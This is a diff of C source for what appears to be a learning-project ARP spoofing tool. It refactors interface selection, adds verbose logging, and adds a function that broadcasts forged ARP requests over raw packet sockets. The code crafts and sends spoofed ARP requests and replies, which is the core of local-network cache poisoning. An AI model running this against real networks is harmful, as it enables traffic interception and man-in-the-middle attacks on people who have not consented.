@@ -35,24 +35,28 @@ struct sockaddr_ll	create_sockaddr(int interface_index, uint8_t *dest_mac, uint8
 	return (addr);
 }
 
-int	get_interace_index(struct ifaddrs *ifaddr, struct ifaddrs *ifa) {
+int	get_interace_index(struct ifaddrs *ifaddr, const char *interface_name) {
 
-	struct ifaddrs	*ifa2;
+	struct ifaddrs	*ifa;
 
-	for (ifa2 = ifaddr; ifa2 != NULL; ifa2 = ifa2->ifa_next) {
+	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
 
-		if (ifa2->ifa_addr == NULL)
+		if (ifa->ifa_addr == NULL || ifa->ifa_netmask == NULL || ifa->ifa_broadaddr == NULL)
 			continue;
 
-		if (!strcmp(ifa->ifa_name, ifa2->ifa_name) && ifa2->ifa_addr->sa_family == AF_PACKET) {
+		if (!strcmp(interface_name, ifa->ifa_name) && ifa->ifa_addr->sa_family == AF_PACKET) {
 
-			printf("Found available interface:  %s\n", ifa->ifa_name);
+			printf("Found available interface:  %s\n", interface_name);
 
-			unsigned int index = if_nametoindex(ifa->ifa_name);
+			unsigned int index = if_nametoindex(interface_name);
 			if (index == 0) {
 				perror("if_nametoindex");
 				return (-1);
 			}
+
+			memcpy(args.if_addr, (void *)&((struct sockaddr_in *)ifa->ifa_addr)->sin_addr, sizeof(args.if_addr));
+			memcpy(args.if_netmask, (void *)&((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr, sizeof(args.if_netmask));
+			memcpy(args.if_broadaddr, (void *)&((struct sockaddr_in *)ifa->ifa_broadaddr)->sin_addr, sizeof(args.if_broadaddr));
 
 			// Debug
 			// printf("Interface index: %u\n", index);
@@ -61,8 +65,41 @@ int	get_interace_index(struct ifaddrs *ifaddr, struct ifaddrs *ifa) {
 		}
 	}
 
-	fprintf(stderr, "Interface %s does not have a AF_PACKET address\n", ifa->ifa_name);
+	fprintf(stderr, "Interface %s does not have a AF_PACKET address\n", interface_name);
 	return (-1);
+}
+
+int	list_interfaces() {
+	struct ifaddrs *ifaddr, *ifa;
+
+	if (getifaddrs(&ifaddr) == -1) {
+		perror("getifaddrs");
+		return (-1);
+	}
+
+	printf("Available interfaces:\n");
+	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+		if (ifa->ifa_addr == NULL || ifa->ifa_addr->sa_family != AF_PACKET)
+			continue;
+
+		if (ifa->ifa_addr->sa_family == AF_PACKET) {
+			printf("Index : (%d) Name : (%s)\n", if_nametoindex(ifa->ifa_name), ifa->ifa_name);
+		}
+	}
+
+	printf("Enter interface name: ");
+	
+	char interface_name[IFNAMSIZ];
+	if (scanf("%15s", interface_name) != 1) {
+		fprintf(stderr, "Failed to read interface name\n");
+		return (-1);
+	}
+
+	int interface_index = get_interace_index(ifaddr, interface_name);
+	
+	freeifaddrs(ifaddr);
+
+	return (interface_index);
 }
 
 int	find_interface()
@@ -93,10 +130,14 @@ int	find_interface()
 		if (!in_same_network(if_ip, src_ip, if_mask, IPV4_ADDR_LEN) || !in_same_network(if_ip, tar_ip, if_mask, IPV4_ADDR_LEN))
 			continue;
 
-		printf("Source IP belongs to interface: %s\n", ifa->ifa_name);
-		printf("Target IP belongs to interface: %s\n", ifa->ifa_name);
+		verbose_log("Source IP belongs to interface: %s\n", ifa->ifa_name);
+		verbose_log("Target IP belongs to interface: %s\n", ifa->ifa_name);
+		verbose_log("\n");
+		verbose_log ("Interface IP: %d.%d.%d.%d\n", if_ip[0], if_ip[1], if_ip[2], if_ip[3]);
+		verbose_log ("Interface Mask: %d.%d.%d.%d\n", if_mask[0], if_mask[1], if_mask[2], if_mask[3]);
+		verbose_log("\n");
 
-		int interface_index = get_interace_index(ifaddr, ifa);
+		int interface_index = get_interace_index(ifaddr, ifa->ifa_name);
 
 		if (interface_index < 0)
 			goto interface_error;
@@ -131,6 +172,8 @@ void	craft_arp_reply(t_ArpPacket *reply) {
 
 	memcpy(reply->tha, args.tar_mac, reply->hln);
 	memcpy(reply->tpa, args.tar_ip, reply->pln);
+
+	verbose_log("ARP Reply is ready to be sent.\nReply size: %lu\n\n", sizeof(*reply));
 }
 
 int	handle_request(char *buff, int packet_socket, struct sockaddr_ll *addr, t_ArpPacket *reply) {
@@ -209,7 +252,7 @@ int	arp_reply_spoof(int interface_index) {
 
 		memcpy(&opcode, buff + ARP_OPCODE_OFFSET, sizeof(uint16_t));
 		if (ntohs(opcode) == ARES_OP_REQUEST) {
-			printf("Received an ARP request, processing it...\n");
+			verbose_log("Received an ARP request, processing it...\n");
 			break ;
 		}
 	}
@@ -244,6 +287,8 @@ void	craft_arp_request(t_ArpPacket *request) {
 	// Because this is an ARP request, the target hardware addresses is set to zero.
 	bzero(request->tha, request->hln);
 	memcpy(request->tpa, args.tar_ip, request->pln);
+
+	verbose_log("ARP Request is ready to be sent.\nRequest size: %lu\n\n", sizeof(*request));
 }
 
 int		arp_request_spoof(int interface_index) {
@@ -262,14 +307,13 @@ int		arp_request_spoof(int interface_index) {
 	}
 
 	craft_arp_request(&request);
+	verbose_log("Sending ARP request to the target...\n\n");
 
 	addr.sll_family = AF_PACKET;
 	addr.sll_protocol = htons(ETH_P_ARP);
 	addr.sll_ifindex = interface_index;
 	addr.sll_halen = request.hln;
 	memcpy(addr.sll_addr, request.dest, ETHER_ADDR_LEN);
-
-	printf("Sending an ARP request to the target...\n");
 
 	if (sendto(packet_socket, &request, sizeof(request), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
 		puts( strerror( errno ) );
@@ -279,4 +323,25 @@ int		arp_request_spoof(int interface_index) {
 
 	close(packet_socket);
 	return (0);
+}
+
+// Set the target IP & MAC to the broadcast address.
+int	interface_spoof(int interface_index) {
+	
+	char interface_name[IFNAMSIZ];
+	if (if_indextoname(interface_index, interface_name) == NULL) {
+		perror("if_indextoname");
+		return (-1);
+	}
+
+	memcpy(args.tar_ip, args.if_broadaddr, IPV4_ADDR_LEN);
+
+	args.tar_mac[0] = 255;
+	args.tar_mac[1] = 255;
+	args.tar_mac[2] = 255;
+	args.tar_mac[3] = 255;
+	args.tar_mac[4] = 255;
+	args.tar_mac[5] = 255;
+
+	return arp_request_spoof(interface_index);
 }
